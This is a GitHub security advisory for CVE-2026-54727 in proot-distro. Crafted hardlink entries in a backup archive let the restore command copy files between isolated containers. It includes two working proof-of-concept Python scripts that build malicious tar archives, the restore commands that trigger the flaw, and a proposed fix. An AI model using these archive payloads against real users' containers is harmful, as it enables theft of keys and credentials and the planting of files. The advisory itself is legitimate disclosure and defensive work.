# [H] proot-distro has a Container Isolation Bypass via Crafted Restore Archive

## Summary
Severity: High
Advisory: GHSA-7h3g-4w2f-fj2f
CVE: CVE-2026-54727
CWE: CWE-668
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-07-29
Source: https://github.com/advisories/GHSA-7h3g-4w2f-fj2f
Type: github-advisory

## Affected
- PyPI: `proot-distro` — affected >=0 <5.1.6

## Details
## Affected Component

- **Package:** proot-distro
- **Affected command:** `restore`
- **Attack surface:** Host-side Termux CLI processing a user-supplied backup archive
- **Vulnerability type:** Container Isolation Bypass / Cross-Container Read and Write

---

## Affected Versions

| Component | Version |
|---|---|
| proot-distro | 5.1.5 (confirmed affected) |
| Test distro | Alpine Linux |
| Architecture | aarch64 |
| Device | Samsung Galaxy A23 |
| Package source | https://packages-cf.termux.dev/apt/termux-main stable/main aarch64 |

---

## Summary

When restoring a crafted backup archive, `proot-distro restore` accepts hardlink entries whose source path references a different installed container.

The restore logic resolves the hardlink source from the archive's `linkname` field and copies the referenced file into the container identified by the archive entry.

Although path traversal protections correctly keep the source path inside the proot-distro containers directory, no validation ensures that the hardlink source container matches the destination container.

As a result, a malicious backup archive can copy files between otherwise isolated containers, enabling both cross-container disclosure and cross-container file injection.

---

## Proof of Concept #1 — Cross-Container File Disclosure

All testing was performed using self-owned containers and harmless marker data only.

### Step 1 — Create a victim container and marker file

```bash
proot-distro install alpine --name victim

proot-distro login victim -- sh -lc '
mkdir -p /root
printf "PROOF-12345\n" > /root/proof.txt
'
```

Verification:

```
proot-distro login victim -- cat /root/proof.txt

PROOF-12345
```

---

### Step 2 — Create an attacker container

```bash
proot-distro install alpine --name attacker
```

---

### Step 3 — Build a crafted archive

```python
python3 -c '
import tarfile

tf = tarfile.open("malicious.tar", "w")

d = tarfile.TarInfo("attacker/rootfs/exfil")
d.type = tarfile.DIRTYPE
d.mode = 0o755
tf.addfile(d)

h = tarfile.TarInfo("attacker/rootfs/exfil/stolen_key")
h.type = tarfile.LNKTYPE
h.linkname = "victim/rootfs/root/proof.txt"
h.mode = 0o600
tf.addfile(h)

tf.close()
'
```

---

### Step 4 — Restore the crafted archive

```bash
proot-distro restore ./malicious.tar
```

---

### Step 5 — Read the copied file from the attacker container

```bash
proot-distro run attacker -- cat /exfil/stolen_key
```

Observed output:

```
PROOF-12345
```

This demonstrates that data originating from the victim container was copied into the attacker container solely through a crafted restore archive.

---

## Proof of Concept #2 — Cross-Container File Injection

### Step 1 — Create attacker-controlled source data

```bash
proot-distro install alpine --name attacker

proot-distro login attacker -- sh -lc '
mkdir -p /root
printf "ATTACKER_DATA\n" > /root/source.txt
'
```

---

### Step 2 — Create a victim container

```bash
proot-distro install alpine --name victim
```

---

### Step 3 — Build a crafted archive

```python
python3 -c '
import tarfile

tf = tarfile.open("write_test.tar", "w")

h = tarfile.TarInfo(
    "victim/rootfs/root/copied_from_attacker.txt"
)

h.type = tarfile.LNKTYPE
h.linkname = "attacker/rootfs/root/source.txt"
h.mode = 0o600

tf.addfile(h)
tf.close()
'
```

---

### Step 4 — Restore the crafted archive

```bash
proot-distro restore ./write_test.tar
```

---

### Step 5 — Verify file injection into the victim container

```bash
cat "$PREFIX/var/lib/proot-distro/containers/victim/rootfs/root/copied_from_attacker.txt"
```

Observed output:

```
ATTACKER_DATA
```

This demonstrates that attacker-controlled data can be copied into a different installed container solely through a crafted restore archive.

---

## Impact

An attacker who can convince a user to restore a crafted backup archive can bypass the expected isolation boundary between installed proot-distro containers.

Observed impacts include:

- Disclosure of files from other installed containers.
- Injection of attacker-controlled files into other installed containers.
- Exposure of SSH private keys.
- Exposure of API credentials.
- Exposure of configuration files containing secrets.
- Exposure of application databases stored inside container rootfs directories.

The issue does not escape the proot-distro containers directory but allows archive-controlled movement of data across otherwise isolated containers.

---

## Root Cause

During hardlink processing, the restore implementation resolves the source container from the archive's `linkname` field.

The resolved path is validated to remain inside a container directory, but the implementation does not verify that the hardlink source container is the same container currently being restored.

As a result, archive-controlled metadata determines which installed container is used as the source of the copy operation.

---

## Proposed Fix

```python
link_container, link_src = _dest_path(member.linkname)

if link_src is None:
    continue

if link_container != container_name:
    continue

link_src = _safe_dest(
    link_container,
    link_src,
    follow_final=True
)
```

This preserves existing path traversal protections while restoring the expected isolation boundary between containers.

---

## Additional Notes

- Issue reproduced on the official Termux package repository.
- No root access was used.
- No third-party data was accessed.
- Testing used only self-owned containers and harmless marker data.
- Cross-container disclosure reproduced using the marker value `PROOF-12345`.
- Cross-container file injection reproduced using the marker value `ATTACKER_DATA`.

## References
- https://github.com/termux/proot-distro/security/advisories/GHSA-7h3g-4w2f-fj2f
- https://github.com/termux/proot-distro/commit/98aff324b7d8500ff75a8ca9ac087ee636be4716
- https://github.com/termux/proot-distro
- https://github.com/termux/proot-distro/releases/tag/v5.1.6
